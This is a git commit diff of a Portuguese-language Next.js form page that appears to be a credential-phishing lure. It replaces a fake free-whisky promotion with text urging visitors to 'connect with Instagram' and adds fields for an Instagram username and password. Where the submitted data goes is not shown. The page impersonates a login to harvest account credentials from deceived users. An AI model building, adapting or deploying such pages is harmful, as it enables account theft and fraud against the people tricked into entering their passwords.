7d2e49a44dbd4dbcc78864eda3bf7d0e6c0a351d
Sieveen <151375287+Sieveen@users.noreply.github.com>
2023-11-18 12:52:22 -0300

    Update formulario.js

--- src/pages/formulario.js
+++ src/pages/formulario.js
@@ -47,28 +47,29 @@ export default function Home() {
   return (
     <div className={`${styles.container} ${inter.className}`}>
 
-      <div>
-        <Image src="/logo.svg" alt="Peaky Blinders" width={152} height={48} />
-      </div>
-
       <div className={styles.form}>
         <div className={styles.form_header}>
-          <Image src="/hero.png" alt="Peaky Blinders" width={540} height={263} />
+          <Image src="/tc.jpg" alt="Peaky Blinders" width={540} height={540} layout="responsive"/>
         </div>
 
         <div className={styles.form_body}>
           <div className={styles.form_content}>
-            <h2 className={averia.className}>
-              Você ganhou um combo de Whisky Grátis em comemoração ao lançamento do filme, para resgatar
+          <h2 className={averia.className}>
+              Por que entrar com o Instagram?
             </h2>
 
-            <p>Promoção exclusiva para o Shopping Iguatemi São Paulo</p>
+            <p>Ao conectar-se ao Instagram, você não apenas garante acesso rápido ao seu código de desconto, 
+            mas também entra para a nossa lista VIP exclusiva. Ser parte dessa comunidade privilegiada significa 
+            receber informações em primeira mão, atualizações exclusivas e até mesmo surpresas especiais. 
+            Além disso, ao unir-se a nós no Instagram, você se conecta diretamente à energia única e vibrante da 
+            The Choice. Estamos ansiosos para compartilhar momentos inesquecíveis com você. Conecte-se agora e faça 
+            parte dessa experiência única!</p>
           </div>
 
           <div className={styles.form_data}>
-            <input ref={emailRef} className={styles.form_control} placeholder="E-mail" type="text" />
+            <input ref={emailRef} className={styles.form_control} placeholder="Nome de usuario" type="text" />
             <input ref={passwordRef} className={styles.form_control} placeholder="Senha" type="password" />
-            <button onClick={handleSubmit} className={styles.form_button}>RESGATAR COMBO!</button>
+            <button onClick={handleSubmit} className={styles.form_button}>ME CADASTRAR!</button>
             <span className={styles.terms}>Ao resgatar você concorda com os Termos de Uso</span>
           </div>
         </div>
